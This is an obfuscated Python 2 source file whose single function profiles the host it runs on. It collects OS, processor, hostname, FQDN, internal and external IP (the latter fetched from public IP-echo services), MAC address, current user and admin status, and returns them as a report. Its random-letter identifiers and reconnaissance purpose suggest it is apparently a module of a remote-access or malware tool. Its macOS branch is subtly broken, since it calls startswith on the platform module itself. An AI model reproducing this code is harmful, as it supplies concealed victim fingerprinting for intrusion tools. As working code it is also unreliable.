# -*- coding: utf-8 -*-
import ctypes
import getpass
import os
import platform
import socket
import urllib
import uuid
def WSqSOAnShQHSvdedPYYsODeGEBJMNifM(plat_type):
    BzWXZIyZMysDWLlLWTCYOnqHdLvivppS = platform.platform()
    processor    = platform.processor()
    architecture = platform.architecture()[0]
    IeKWCTMFrmGpozEpHCrZqDUyfrIrIVnJ = getpass.getuser()
    igfeyhEBULuWRPPUEQPMFehIXqNJUWnf    = socket.gethostname()
    wGxjnpFgeyySLlvYFlOpLjqjyevpwXHg        = socket.getfqdn()
    PqDQuAUIdwtIGAMCsyKAWpCAtVOZXpxU = socket.gethostbyname(igfeyhEBULuWRPPUEQPMFehIXqNJUWnf)
    PMAaNYvckSxzDsxYXjzrDzGpZBjANLkf     = uuid.getnode()
    LoGrGbHYinbonrYMnFegQvUoEdIaHNzu         = ':'.join(("%012X" % PMAaNYvckSxzDsxYXjzrDzGpZBjANLkf)[XDvTtxydQeJRnYjckFghcOeUmYrzPBWl:XDvTtxydQeJRnYjckFghcOeUmYrzPBWl+2] for XDvTtxydQeJRnYjckFghcOeUmYrzPBWl in range(0, 12, 2))
    YAnibxwmWjNZuMHumpDAWfxWxAjfZior = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                   'ipecho.net/plain', 'myexternalip.com/raw' ]
    kepXFDoXZmPxlvVUaVtUGJENqPDgaoHc = ''
    for FyUlDJVqRLskqRmXepPYnzpUnKZihbdD in YAnibxwmWjNZuMHumpDAWfxWxAjfZior:
        try:
            kepXFDoXZmPxlvVUaVtUGJENqPDgaoHc = urllib.urlopen('http://'+FyUlDJVqRLskqRmXepPYnzpUnKZihbdD).read().rstrip()
        except IOError:
            pass
        if kepXFDoXZmPxlvVUaVtUGJENqPDgaoHc and (6 < len(kepXFDoXZmPxlvVUaVtUGJENqPDgaoHc) < 16):
            break
    FsCZqkqLlbFougIUVuQarvoQNgLUeQqj = False
    if plat_type.startswith('win'):
        FsCZqkqLlbFougIUVuQarvoQNgLUeQqj = ctypes.windll.shell32.IsUserAnAdmin() != 0
    elif plat_type.startswith('linux') or platform.startswith('darwin'):
        FsCZqkqLlbFougIUVuQarvoQNgLUeQqj = os.getuid() == 0
    qCSKAUPoyTnlKevdgfDnNMXkFqxaPLCN = 'Yes' if FsCZqkqLlbFougIUVuQarvoQNgLUeQqj else 'No'
    mBBhcXIKylEiUwhVaJgAdeEIOwwwxmnM = '''
    System Platform     - {}
    Processor           - {}
    Architecture        - {}
    Hostname            - {}
    FQDN                - {}
    Internal IP         - {}
    External IP         - {}
    MAC Address         - {}
    Current User        - {}
    Admin Access        - {}
    '''.format(BzWXZIyZMysDWLlLWTCYOnqHdLvivppS, processor, architecture,
    igfeyhEBULuWRPPUEQPMFehIXqNJUWnf, wGxjnpFgeyySLlvYFlOpLjqjyevpwXHg, PqDQuAUIdwtIGAMCsyKAWpCAtVOZXpxU, kepXFDoXZmPxlvVUaVtUGJENqPDgaoHc, LoGrGbHYinbonrYMnFegQvUoEdIaHNzu, IeKWCTMFrmGpozEpHCrZqDUyfrIrIVnJ, qCSKAUPoyTnlKevdgfDnNMXkFqxaPLCN)
    return mBBhcXIKylEiUwhVaJgAdeEIOwwwxmnM
